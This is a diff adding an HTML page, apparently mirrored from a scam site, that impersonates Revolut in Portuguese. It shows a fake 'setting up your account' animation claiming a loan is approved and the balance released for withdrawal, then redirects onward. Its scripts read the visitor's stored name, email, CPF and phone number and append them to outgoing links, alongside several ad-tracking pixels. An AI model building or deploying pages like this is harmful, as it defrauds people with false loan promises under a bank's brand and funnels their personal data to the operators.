@@ -1,0 +1,493 @@
+<!DOCTYPE html><html lang="pt-BR"><!-- Mirrored from suupr-fk.pages.dev/configurando-conta by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 02 Apr 2026 11:36:25 GMT --><!-- Added by HTTrack --><head><meta content="text/html;charset=utf-8" http-equiv="content-type"><!-- /Added by HTTrack -->
+
+<script>
+(function(){
+  var UTM_KEYS=['src','sck','utm_source','utm_campaign','utm_medium','utm_content','utm_term','fbclid','ttclid','gclid','gbraid','wbraid','click_id','CampaignID']; window.TRACKING_KEYS=UTM_KEYS;
+  var p=new URLSearchParams(window.location.search);
+  UTM_KEYS.forEach(function(k){ if(p.get(k)) localStorage.setItem(k,p.get(k)); });
+  var changed=false;
+  UTM_KEYS.forEach(function(k){ var v=localStorage.getItem(k); if(v&&!p.has(k)){p.set(k,v);changed=true;} });
+  if(changed) history.replaceState(null,'','?'+p.toString());
+  document.addEventListener('click',function(e){
+    var a=e.target.closest('a');
+    if(a&&a.href){ try{ var u=new URL(a.href,window.location.href); UTM_KEYS.forEach(function(k){ var v=localStorage.getItem(k); if(v&&!u.searchParams.has(k)) u.searchParams.set(k,v); }); a.href=u.toString(); }catch(ex){} }
+  },true);
+})();
+</script>
+
+<script>
+function redirectWithParams(destination) {
+const currentParams = window.location.search;
+if (!currentParams) {
+window.location.href = destination;
+return;
+}
+
+if (destination.includes("?")) {
+window.location.href = destination + "&" + currentParams.substring(1);
+} else {
+window.location.href = destination + currentParams;
+}
+}
+</script>
+
+<meta charset="utf-8">
+<meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport">
+<title>Revolut — Configurando sua conta</title>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&family=Outfit:wght@400;500;600;700;800&family=Sora:wght@600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html,
+    body {
+      height: 100%;
+      width: 100%;
+      overflow: hidden;
+    }
+
+    body {
+      font-family: 'DM Sans', sans-serif;
+      background: #f3f4f6;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: fixed;
+      inset: 0;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* Decorative blobs */
+    body::before, body::after { display: none; }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      padding: 40px 30px;
+      max-width: 380px;
+      width: 100%;
+      position: relative;
+      z-index: 1;
+    }
+
+    /* ===== LOGO ===== */
+    .logo {
+      margin-bottom: 8px;
+      animation: fadeDown .6s ease;
+    }
+
+    .logo-row {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .logo .la {
+      font-family: 'Sora', sans-serif;
+      font-weight: 800;
+      font-size: 32px;
+      color: #0a0a0a;
+      letter-spacing: -.5px;
+      line-height: 1;
+    }
+
+    .logo .lc {
+      font-family: 'Sora', sans-serif;
+      font-weight: 800;
+      font-size: 32px;
+      color: #0a0a0a;
+      letter-spacing: -.5px;
+      line-height: 1;
+    }
+
+    .logo-tag {
+      font-family: 'DM Sans', sans-serif;
+      font-weight: 600;
+      font-size: 9px;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      color: #9ca3af;
+      margin-top: 3px;
+    }
+
+    /* ===== GREETING ===== */
+    .greeting {
+      margin: 36px 0 6px;
+      animation: fadeDown .6s .3s ease both;
+    }
+
+    .greeting span {
+      font-size: 16px;
+      color: #6b7280;
+    }
+
+    .greeting h1 {
+      font-family: 'Outfit', sans-serif;
+      font-size: 28px;
+      font-weight: 800;
+      color: #0a0a0a;
+      margin-top: 2px;
+    }
+
+    /* ===== SPINNER ===== */
+    .spinner-area {
+      margin: 40px 0 16px;
+      animation: fadeDown .6s .6s ease both;
+    }
+
+    .spinner {
+      width: 52px;
+      height: 52px;
+      border: 3.5px solid #e5e7eb;
+      border-top: 3.5px solid #374151;
+      border-radius: 50%;
+      animation: spin .85s linear infinite;
+      margin: 0 auto;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .status-text {
+      font-family: 'Outfit', sans-serif;
+      font-size: 18px;
+      font-weight: 600;
+      color: #374151;
+      margin-top: 18px;
+      animation: fadeDown .6s .8s ease both;
+    }
+
+    /* ===== CHECKLIST ===== */
+    .checklist {
+      margin-top: 32px;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+      width: 100%;
+      max-width: 320px;
+    }
+
+    .check-item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      opacity: 0;
+      transform: translateY(12px);
+      transition: all .5s cubic-bezier(.4, 0, .2, 1);
+    }
+
+    .check-item.show {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    .check-icon {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #f3f0ff;
+      border: 2px solid #e0d7ff;
+      transition: all .4s ease;
+    }
+
+    .check-item.show .check-icon {
+      background: #ede9fe;
+      border-color: #c4b5fd;
+    }
+
+    .check-icon svg {
+      width: 14px;
+      height: 14px;
+      color: #7c3aed;
+      stroke-width: 3;
+      opacity: 0;
+      transform: scale(.5);
+      transition: all .3s .1s ease;
+    }
+
+    .check-item.show .check-icon svg {
+      opacity: 1;
+      transform: scale(1);
+    }
+
+    .check-text {
+      font-size: 15px;
+      font-weight: 500;
+      color: #374151;
+      text-align: left;
+    }
+
+    /* ===== PROGRESS BAR ===== */
+    .progress-wrap {
+      width: 100%;
+      max-width: 280px;
+      margin-top: 36px;
+      animation: fadeDown .6s 1s ease both;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 4px;
+      background: #e5e7eb;
+      border-radius: 4px;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      height: 100%;
+      width: 0%;
+      background: #0a0a0a;
+      border-radius: 4px;
+      transition: width .6s ease;
+    }
+
+    .progress-label {
+      font-size: 11px;
+      color: #9ca3af;
+      margin-top: 8px;
+    }
+
+    /* ===== FOOTER ===== */
+    .splash-foot {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      padding: 16px 20px env(safe-area-inset-bottom, 16px);
+      text-align: center;
+    }
+
+    .splash-foot p {
+      font-size: 10.5px;
+      color: #9ca3af;
+      line-height: 1.5;
+    }
+
+    /* ===== ANIMATIONS ===== */
+    @keyframes fadeDown {
+      from {
+        opacity: 0;
+        transform: translateY(-12px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+  </style>
+
+
+<script>
+  window.pixelId = "6a5594cf5757aed4584adce8";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.googlePixelId = "6a45c62144ce1832379750fa";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+  document.head.appendChild(a);
+</script>
+
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+  window.tikTokPixelId = "6a5593d07d9a2ac947099389";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.va = window.va || function () { (window.vaq = window.vaq || []).push(arguments); };
+</script>
+<script defer="" src="js/script.js"></script>
+
+<style id="legal-footer-style">
+  .legal-footer{width:100%;max-width:760px;margin:22px auto 0;padding:18px 16px 26px;text-align:center;color:#6b7280;font-size:11.5px;line-height:1.55}
+  .legal-footer__company{font-weight:700;color:#111827;margin-bottom:2px}
+  .legal-footer__links{display:flex;justify-content:center;gap:12px;flex-wrap:wrap;margin-top:8px}
+  .legal-footer__links a{color:#111827;text-decoration:underline;text-underline-offset:3px}
+</style>
+  <script src="js/tracking.js" data-project="revoopt-blue-one" defer=""></script>
+</head>
+<body>
+<div class="container">
+<!-- LOGO -->
+<div class="logo">
+<div class="logo-row"><img src="images/revolut-logo.svg" alt="Revolut" style="height:34px;width:auto;display:block;"></div>
+</div>
+<!-- GREETING -->
+<div class="greeting">
+<span>Olá,</span>
+<h1 id="userName">Cliente</h1>
+</div>
+<!-- SPINNER -->
+<div class="spinner-area">
+<div class="spinner"></div>
+</div>
+<div class="status-text" id="statusText">Configurando sua conta</div>
+<!-- CHECKLIST -->
+<div class="checklist" id="checklist">
+<div class="check-item" id="step1">
+<div class="check-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+<path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path>
+</svg></div>
+<span class="check-text">Conta criada com sucesso</span>
+</div>
+<div class="check-item" id="step2">
+<div class="check-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+<path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path>
+</svg></div>
+<span class="check-text">Empréstimo aprovado e disponível</span>
+</div>
+<div class="check-item" id="step3">
+<div class="check-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+<path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path>
+</svg></div>
+<span class="check-text">Saldo liberado para saque</span>
+</div>
+<div class="check-item" id="step4">
+<div class="check-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+<path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path>
+</svg></div>
+<span class="check-text">Conta pronta para transferência</span>
+</div>
+</div>
+<!-- PROGRESS BAR -->
+<div class="progress-wrap">
+<div class="progress-bar">
+<div class="progress-fill" id="progFill"></div>
+</div>
+<div class="progress-label" id="progLabel">Preparando tudo para si...</div>
+</div>
+</div>
+<!-- FOOTER -->
+<div class="splash-foot">
+<p>Rev Business LTD — Sucursal em Portugal<br>Ambiente seguro com encriptação SSL</p>
+</div>
+<script>
+    // Load user name
+    const nome = localStorage.getItem('nome') || '';
+    if (nome) {
+      const primeiro = nome.trim().split(' ')[0];
+      document.getElementById('userName').textContent = primeiro;
+    }
+
+    const steps = ['step1', 'step2', 'step3', 'step4'];
+    const fill = document.getElementById('progFill');
+    const label = document.getElementById('progLabel');
+    const statusText = document.getElementById('statusText');
+
+    const messages = [
+      'Configurando sua conta',
+      'Verificando dados',
+      'Ativando empréstimo',
+      'Preparando ambiente',
+      'Quase pronto...'
+    ];
+
+    // Animate steps one by one
+    let current = 0;
+    function nextStep() {
+      if (current < steps.length) {
+        document.getElementById(steps[current]).classList.add('show');
+        fill.style.width = ((current + 1) / steps.length * 100) + '%';
+        if (current < messages.length) {
+          statusText.textContent = messages[current + 1] || messages[current];
+        }
+        current++;
+        setTimeout(nextStep, 1800);
+      } else {
+        // All done - redirect
+        label.textContent = 'Pronto! Redirecionando...';
+        statusText.textContent = 'Tudo pronto!';
+        setTimeout(() => {
+          const p = new URLSearchParams(window.location.search);
+          redirectWithParams('conta.html');
+        }, 1200);
+      }
+    }
+
+    // Start after initial animations
+    setTimeout(nextStep, 1800);
+  </script>
+<script crossorigin="anonymous" data-cf-beacon="{" version":"2024.11.0","token":"291788ee003a413395b0add202b81cef","r":1,"server_timing":{"name":{"cfcachestatus":true,"cfedge":true,"cfextpri":true,"cfl4":true,"cforigin":true,"cfspeedbrain":true},"location_startswith":null}}"="" defer="" src="v8c78df7c7c0f484497ecbca7046644da1771523124516-8.html"></script>
+
+<script>
+  // UTM and Checkout Prefill
+  document.addEventListener("DOMContentLoaded", function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    
+    // Check localStorage for checkout prefill data
+    const userMap = {
+      'name': ['nome', 'name'],
+      'email': ['email'],
+      'document': ['cpf', 'document'],
+      'phone': ['telefone', 'telephone', 'phone']
+    };
+    
+    for (const targetKey in userMap) {
+      if (!urlParams.has(targetKey) || !urlParams.get(targetKey)) {
+        for (const localKey of userMap[targetKey]) {
+          const localVal = localStorage.getItem(localKey);
+          if (localVal) {
+            let val = localVal;
+            if (targetKey === 'document' || targetKey === 'phone') {
+              val = val.replace(/\D/g, ''); // Keep only numbers for CPF/Phone
+            }
+            urlParams.set(targetKey, val);
+            break;
+          }
+        }
+      }
+    }
+    
+    const searchString = urlParams.toString();
+    if (searchString) {
+      const links = document.querySelectorAll("a");
+      links.forEach(function(link) {
+        let href = link.getAttribute("href");
+        if (href && !href.startsWith("#") && !href.startsWith("javascript")) {
+          // Exclude if it already has these parameters to avoid duplicates
+          if (!href.includes("name=") && !href.includes("document=")) {
+            const separator = href.includes("?") ? "&" : "?";
+            link.setAttribute("href", href + separator + searchString);
+          }
+        }
+      });
+    }
+  });
+</script>
+
+
+
+<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'sxb1plzcpnl503952'},{'dcenter':'sxb1'},{'cp_id':'10972497'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src="js/scc-c2.min.js"></script>
+<div class="legal-footer">
+  <div class="legal-footer__company">Rev Business LTD</div>
+  <div>Avenida da Liberdade, 110, 1269-046 Lisboa, Portugal</div>
+  <div class="legal-footer__links">
+    <a href="termos-de-uso.html">Termos de Uso</a>
+    <a href="politica-de-privacidade.html">Política de Privacidade</a>
+  </div>
+</div>
+
+</body><!-- Mirrored from suupr-fk.pages.dev/configurando-conta by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 02 Apr 2026 11:36:26 GMT --></html>
